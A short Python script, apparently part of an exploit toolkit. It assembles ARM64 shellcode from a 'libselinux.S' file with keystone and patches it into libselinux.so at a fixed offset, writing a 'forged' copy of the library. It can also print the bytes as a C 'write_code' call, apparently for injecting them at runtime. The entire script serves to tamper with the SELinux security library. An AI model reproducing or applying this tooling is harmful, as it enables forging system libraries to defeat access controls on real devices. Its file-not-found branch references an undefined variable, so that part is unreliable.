import os
import traceback
import re
import sys

from keystone import *

data = [
    [
        'LIBSELINUX',
        '../research/libselinux.so',
        0x12684,
        'libselinux.S'
    ]
]

for lib_const_name, target_lib, shellcode_offset, shellcode_path in data:
    if not os.path.exists(shellcode_path):
        print(shellcode, 'file not found')
        exit(1)

    with open(shellcode_path, "rb") as payload:
        payload = payload.read()
    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
    encoding, count = ks.asm(payload)

    tot = ""
    ret = ""
    for i in encoding:
        ret += hex(i).replace("0x", "").rjust(2, "0")

    if len(sys.argv) > 1 and sys.argv[1] == 'print':
        shellcode_text = '\\x' + ('\\x'.join(re.findall('..', ret)))
        print(f'write_code({lib_const_name}, {hex(shellcode_offset)}, {hex(int(len(ret)/ 2))}, "{shellcode_text}");')
    else:
        with open(target_lib, 'rb') as f:
            lib = bytearray(f.read())

        lib_start = lib[:shellcode_offset]
        lib_end = lib[shellcode_offset + len(encoding):]
        crafted = lib_start + bytearray(encoding) + lib_end
        with open(f'{target_lib.replace(".so", ".forged.so")}', 'wb') as f:
            f.write(crafted)
